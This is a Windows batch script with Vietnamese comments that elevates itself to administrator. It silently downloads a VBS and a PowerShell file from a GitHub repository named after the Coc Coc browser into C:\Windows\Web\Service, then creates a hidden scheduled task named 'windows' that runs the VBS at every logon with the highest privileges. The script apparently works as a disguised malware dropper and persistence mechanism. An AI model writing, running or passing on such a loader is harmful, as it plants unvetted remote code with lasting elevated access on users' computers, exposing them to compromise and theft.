@echo off
:: Kiểm tra quyền quản trị
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -command "Start-Process cmd -ArgumentList '/c %~f0' -Verb RunAs"
    exit
)

:: Thiết lập biến
set "winsysUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/winsys.vbs"
set "serviceUrl=https://raw.githubusercontent.com/quannqttg/coccoc/main/service.ps1"
set "destinationDir=C:\Windows\Web\Service"
set "winsysDownloadFile=winsys.vbs"
set "serviceDownloadFile=service.ps1"
set "taskName=windows"

:: Tạo thư mục nếu chưa tồn tại
if not exist "%destinationDir%" (
    mkdir "%destinationDir%"
)

:: Chuyển đến thư mục đích
cd /d "%destinationDir%" >nul 2>&1

:: Tải xuống tệp winsys.vbs
curl -L -o "%winsysDownloadFile%" "%winsysUrl%" >nul 2>&1

:: Tải xuống tệp service.ps1
curl -L -o "%serviceDownloadFile%" "%serviceUrl%" >nul 2>&1

:: Kiểm tra xem tệp winsys.vbs đã tải xuống thành công chưa
if exist "%winsysDownloadFile%" (
    if not exist "%destinationDir%\%winsysDownloadFile%" (
        exit
    )
) else (
    exit
)

:: Kiểm tra xem tệp service.ps1 đã tải xuống thành công chưa
if exist "%serviceDownloadFile%" (
    if not exist "%destinationDir%\%serviceDownloadFile%" (
        exit
    )
) else (
    exit
)

:: Kiểm tra và xóa tác vụ cũ nếu có
schtasks /query /tn "%taskName%" >nul 2>&1
if %errorlevel% equ 0 (
    schtasks /delete /tn "%taskName%" /f >nul 2>&1
)

:: Tạo tác vụ trong Task Scheduler để chạy winsys.vbs bằng wscript.exe
schtasks /create /tn "%taskName%" /tr "\"C:\Windows\System32\wscript.exe\" \"C:\Windows\Web\Service\%winsysDownloadFile%\"" /sc onlogon /ru "%USERNAME%" /RL HIGHEST /F >nul 2>&1

:: Kiểm tra kết quả tạo tác vụ
if %errorlevel% neq 0 (
    exit
)

exit
